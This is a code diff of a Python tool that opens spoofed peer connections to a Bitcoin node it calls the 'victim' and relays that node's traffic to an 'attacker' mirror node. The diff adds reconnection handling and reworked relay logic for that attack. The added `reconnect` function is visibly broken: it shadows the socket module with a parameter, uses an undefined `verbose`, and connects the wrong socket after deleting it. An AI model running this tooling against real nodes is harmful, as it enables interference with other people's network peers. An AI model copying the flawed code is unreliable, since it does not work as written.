@@ -148,11 +148,11 @@ def close_connection(socket, mirror_socket, ip, port, interface):
 	except: pass
 	try:
 		if socket in identity_socket: identity_socket.remove(socket)
-		else: del socket
+		del socket
 
 		if mirror_socket != None:
 			if mirror_socket in identity_mirror_socket: identity_mirror_socket.remove(mirror_socket)
-			else: del mirror_socket
+			del mirror_socket
 
 		if interface in identity_interface: identity_interface.remove(interface)
 		if (ip, port) in identity_address: identity_address.remove((ip, port))
@@ -223,38 +223,31 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 	# Listen to the connections for future packets
 	if verbose: print(f'Attaching packet listener to {interface}')
 	create_task('Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
-	"""try:
-		start_new_thread(sniff, (), {
-			'socket': s,
-			'mirror_socket': mirror_socket,
-			'src_ip': src_ip,
-			'src_port': src_port,
-			'dst_ip': dst_ip,
-			'dst_port': dst_port,
-			'interface': interface
-		})
-	except:
-		print(f'Error: unable to start thread to sniff interface {interface}')"""
 
 	if mirror_socket != None:
 		if verbose: print(f'Attaching mirror packet listener to {interface}')
 		create_task('Mirror identity ' + src_ip, mirror_sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
-		"""try:
-			start_new_thread(mirror_sniff, (), {
-				'socket': mirror_socket,
-				'orig_socket': s,
-				'src_ip': src_ip,
-				'src_port': src_port,
-				'dst_ip': dst_ip,
-				'dst_port': dst_port,
-				'interface': interface
-			})
-		except:
-			print(f'Error: unable to start thread to sniff interface {interface}')"""
 
 # Reconnect a peer
-def reconnect(socket, src_ip, src_port, dst_ip, dst_port):
+def reconnect(socket, other_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
+	socket.close()
+	if socket in identity_socket: identity_socket.remove(socket)
+	del socket
+
 	print(f'Reconnecting to ({dst_ip} : {dst_port})')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
+	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+	while success == -1:
+		print(f'Setting socket network interface to "{network_interface}"...')
+		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+
+	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
+	s.bind((src_ip, src_port))
+
+	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
+
 	socket.connect((dst_ip, dst_port))
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
 	socket.sendall(version.to_bytes())
@@ -262,7 +255,10 @@ def reconnect(socket, src_ip, src_port, dst_ip, dst_port):
 	verack = msg_verack(bitcoin_protocolversion)
 	socket.sendall(verack.to_bytes())
 	verack = s.recv(1024)
+	identity_socket.append(socket)
+	create_task('Reconnected ' + src_ip, sniff_func, socket, other_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func)
 	print(f'Successfully reconnected ({src_ip} : {src_port})')
+	return socket
 
 
 
@@ -302,29 +298,27 @@ def mirror_make_fake_connection(interface, src_ip, verbose=True):
 	s.sendall(verack.to_bytes())
 	# Get verack packet
 	verack = s.recv(1024)
-
 	if verbose: print('Mirrored connection successful!')
-
 	return s
 
 
 def sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while not thread.stopped():
 		packet = socket.recv(65565)
-		create_task('Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
+		create_task('Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
 	close_connection(socket, mirror_socket, dst_ip, dst_port, interface)
-	close_connection(mirror_socket, socket, src_ip, src_port, interface)
+	#close_connection(mirror_socket, socket, src_ip, src_port, interface)
 
 def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while not thread.stopped():
 		packet = socket.recv(65565)
-		create_task('Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface)
+		create_task('Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
 	close_connection(socket, orig_socket, src_ip, src_port, interface)
-	close_connection(orig_socket, socket, dst_ip, dst_port, interface)
+	#close_connection(orig_socket, socket, dst_ip, dst_port, interface)
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
-def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
+def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
 	from_ip = dst_ip
 	from_port = dst_port
 	to_ip = src_ip
@@ -356,24 +350,31 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Victim message received ** {from_ip} --> {to_ip} ** {msg_type}')
 
-	if mirror_socket == None: return # If the mirror's socket isn't running, don't bother trying to relay
-	try:
-		if msg_type == 'ping':
-			# Parse the message payload
-			msg = MsgSerializable.from_bytes(packet)
+	if msg_type == 'ping':
+		if socket == None: return # If the destination socket isn't running, ignore packet
+		# Parse the message payload
+		msg = MsgSerializable.from_bytes(packet)
 
-			pong = msg_pong(bitcoin_protocolversion)
-			pong.nonce = msg.nonce
+		pong = msg_pong(bitcoin_protocolversion)
+		pong.nonce = msg.nonce
+		try: # src --> dst
 			socket.sendall(pong.to_bytes())
-		elif msg_type == 'version': pass # Ignore version
-		elif msg_type == 'verack': pass # Ignore version
-		else:
+		except Exception as e:
+			print(f'Lost connection to ({victim_ip} : {victim_port})')
+			reconnect(socket, mirror_socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
+			parent_thread.stop()
+	elif msg_type == 'version': pass # Ignore version
+	elif msg_type == 'verack': pass # Ignore verack
+	else:
+		if mirror_socket == None: return # If the destination socket isn't running, ignore packet
+		try: # src --> attacker
 			mirror_socket.sendall(packet) # Relay to the mirror
+		except Exception as e:
+			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
+			reconnect(mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
+			parent_thread.stop()
 
-	except Exception as e:
-		print(f'Lost connection to ({from_ip} : {from_port})')
-		reconnect(mirror_socket, src_ip, src_port, dst_ip, dst_port)
-		#parent_thread.stop()
+
 		#close_connection(socket, mirror_socket, from_ip, from_port, interface)
 		#print("Closing socket because of error: " + str(e))
 		#make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = False, attempt_number = 3)
@@ -382,7 +383,7 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 # Called when a packet is sniffed from the network
 # Return true to end the thread
 
-def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
+def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
 	from_ip = src_ip
 	from_port = src_port
 	to_ip = dst_ip
@@ -424,20 +425,26 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 
 	print(f'*** Mirrored response sent  ** {from_ip} --> {to_ip} ** {msg_type}')
 	if orig_socket == None: return False # If the original's socket isn't running, don't bother trying to relay
-	try:
-		if msg_type == 'ping':
-			# Parse the message payload
-			msg = MsgSerializable.from_bytes(packet)
+	if msg_type == 'ping':
+		# Parse the message payload
+		msg = MsgSerializable.from_bytes(packet)
 
-			pong = msg_pong(bitcoin_protocolversion)
-			pong.nonce = msg.nonce
+		pong = msg_pong(bitcoin_protocolversion)
+		pong.nonce = msg.nonce
+		try:
 			socket.sendall(pong.to_bytes())
-		else:
+		except Exception as e:
+			print(f'Lost connection to ({victim_ip} : {victim_port})')
+			reconnect(socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
+			parent_thread.stop()
+	else:
+		try:
 			orig_socket.sendall(packet) # Relay to the victim
+		except Exception as e:
+			print(f'Lost connection to ({victim_ip} : {victim_port})')
+			reconnect(orig_socket, socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
+			parent_thread.stop()
 
-	except Exception as e:
-		print(f'Lost connection to ({from_ip} : {from_port})')
-		reconnect(orig_socket, src_ip, src_port, dst_ip, dst_port)
 		# print("Closing socket because of error: " + str(e))
 		# parent_thread.stop()
 		# socket.close()
